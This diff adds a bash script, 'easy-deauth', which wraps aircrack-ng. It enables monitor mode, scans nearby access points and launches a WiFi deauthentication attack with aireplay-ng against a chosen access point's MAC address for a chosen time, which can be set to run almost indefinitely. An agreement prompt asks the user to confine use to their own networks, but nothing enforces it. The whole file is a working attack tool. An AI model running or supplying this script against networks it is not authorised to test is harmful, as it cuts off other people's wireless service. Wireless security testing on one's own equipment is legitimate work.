@@ -1,0 +1,270 @@
+#!/bin/bash
+
+# easy-deauth
+
+#
+# Copyright (C) 2018 Caleb Woodbine <calebwoodbine.public@gmail.com>
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
+#
+
+opt="$1"
+
+VERSION=1.1
+
+function verifyUser() {
+# check if user can run sudo/root commands, and confirm agreement
+
+hasSudo=$(sudo -nv 2>&1)
+if [[ "$hasSudo" = "sudo: a password is required" || "$hasSudo" = "" || -z "$hasSudo" ]] && which sudo > /dev/null
+then
+	sudoProg="sudo"
+
+elif [ "$(id -u)" = 0 ]
+then
+	sudoProg=""
+else
+	echo ">> You must be in sudoers or be root to use some this program."
+	exit 1
+fi
+
+if [ ! -f "$HOME/.config/easy-deauth.agree" ]
+then
+	echo "Do you agree to only use this program for research purposes -- Of which only on APs which you own, or at your residence?"
+	echo "NOTE: I am not liable for any thing you do with this software."
+	read -r -p "I [AGREE|DISAGREE]: " agreement
+	agreement=$(echo $agreement | tr [:lower:] [:upper:])
+	case "$agreement" in
+		AGREE)
+			echo -e "Agreement accepted.\n"
+			touch "$HOME/.config/easy-deauth.agree"
+		;;
+		
+		DISAGREE)
+			echo "Agreement has been declined."
+			exit 0
+		;;
+
+		*)
+			echo "Please type 'AGREE' or 'DISAGREE'."
+			exit 0		
+		;;
+	esac
+fi
+
+}
+
+function getInterfaces() {
+# user selects list of interfaces
+
+echo 'Please choose one of the available interfaces from this list:'
+
+for i in $(ifconfig -a -s | cut -f1 -d' '  | sed -e 's/Iface//g' | sed -e 's/lo//g' | sed '/^\s*$/d'); do
+	[ -d /sys/class/net/$i/wireless ] && probablyWireless="<-- Possibly a wireless interface." || probablyWireless=""
+	devNetNum=$((devNetNum + 1))
+	echo "[$devNetNum]: $i	$probablyWireless"
+
+done
+
+echo "[Q/e]: Quit/Exit"
+read -r -p 'Please select your Wireless Interface: ' wifdr
+
+if [[ $wifdr =~ ^-?[0-9]+$ ]]
+then
+	wifd=$(ifconfig -a -s | cut -f1 -d' ' | sed -e 's/Iface//g' | sed -e 's/lo//g' | sed '/^\s*$/d' | sed "${wifdr}p;d")
+
+else
+	wifd="$wifdr"
+
+fi
+
+case "$wifdr" in
+	"q"|"Q"|"e"|"E")
+		exit 0
+	;;
+esac
+
+mon="mon"
+echo "Note: if you choose to prematurely quit easy-deauth, you'll need to disable monitor mode."
+echo "To do so: '"$sudoProg" airmon-ng stop $wifd$mon'"
+read -r -p "Are you sure you want to use this interface? [y|*] " cont
+case $cont in
+	"y"|"Y")
+		setupMonitorMode
+		listAccessPoints
+		changeMonitorChannel
+	;;
+
+	*)
+		echo "Exiting."
+		exit 0
+	;;
+esac
+
+}
+
+function setupMonitorMode() {
+# setup monitor mode for a wireless network interface
+if "$sudoProg" airmon-ng start "$wifd" > /dev/null
+then
+	echo "Monitor mode enabled for: $wifd"
+	trap deconfigure EXIT
+else
+	echo "Monitor mode failed to setup."
+	exit 1
+fi
+
+}
+
+function listAccessPoints() {
+# get a list of available access points
+wifdlAP="$wifd$mon"
+echo "When running at anypoint, to quit process use Ctrl^C once you've found the MAC address of the target address."
+echo "Check for the 6th row across marked 'CH'."
+read -r -p "Press enter to continue... "
+"$sudoProg" airodump-ng "$wifdlAP"
+
+}
+
+function changeMonitorChannel() {
+# change channel to target channel
+
+read -r -p "Enter target channel number (^CH): " targetChannel
+
+case "$targetChannel" in
+	[0-9])
+		"$sudoProg" airmon-ng stop "$wifd$mon" > /dev/null && echo "Reconfiguring $wifd"
+		"$sudoProg" airmon-ng start "$wifd" "$targetChannel" > /dev/null && echo "Monitor mode enabled on channel $targetChannel for: $wifd"
+		selectTarget
+	;;
+
+	*)
+		echo "'$targetChannel' is not a number... please type a number..."
+		changeMonitorChannel
+	;;
+esac
+
+}
+
+function selectTarget() {
+# selecting a MAC address
+
+echo "Please enter target MAC address. (Note: you can copy from above ^) "
+read -r -p "Target: " targetMAC
+
+if ! echo "$targetMAC" | grep -E -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$"
+then
+		echo "Invalid MAC address."
+		selectTarget
+fi
+
+#execution
+setTime
+
+}
+
+function setTime() {
+# sets the length for the attack
+
+read -r -p "Please enter seconds to run deauth attack for: " length
+
+if [[ "$length" =~ ^-?[0-9]+$ ]]
+then
+	if [ "$length" = "-1" ]
+	then
+		length="9999999999"
+	fi
+	#runAttack
+	execution
+	sss="s"
+else
+	setTime
+fi
+
+}
+
+function execution() {
+# read -ry to run, can still back out
+
+read -r -p "Are you sure that you want to run this attack? [Y/n] " execDeauth
+
+case "$execDeauth" in
+	y|Y)
+		#setTime
+		runAttack
+	;;
+
+	n|N)
+		#deconfigure to cancel
+		echo "Exiting and reconfiguring $wifd..."
+		"$sudoProg" airmon-ng stop "$wifd$mon" > /dev/null
+		echo "Reconfiguring complete, exiting..."
+		exit 0
+
+	;;
+
+	*)
+  		execution
+	;;
+esac
+
+}
+
+function runAttack() {
+# this executes the commands with user variables
+
+echo "About to run; Reminder to press Ctrl^C when you're happy with your attack!"
+sleep 2
+
+"$sudoProg" timeout "$length$sss" aireplay-ng -0 0 -a "$targetMAC" "$wifd$mon"
+
+trap "" EXIT
+
+#deconfigure from monitor mode
+echo "Attack finished; Reconfiguring interface $wifd and closing..."
+deconfigure
+echo "Complete. Done."
+exit 0
+
+}
+
+function deconfigure() {
+# function to deconfigure network interface
+echo -e "\nDeconfiguring interface '$wifd'."
+if "$sudoProg" airmon-ng stop "$wifd$mon" > /dev/null
+then
+	exit 0
+else
+	echo "Failed to deconfigure interface."
+	echo "Please run '"$sudoProg" airmon-ng stop $wifd$mon'."
+	exit 1
+fi
+
+}
+
+case "$opt" in
+	-h|--help)
+
+	;;
+
+	-v|--version)
+		echo "easy-deauth version '$VERSION'"
+	;;
+
+	*)
+		verifyUser
+		getInterfaces
+	;;
+esac
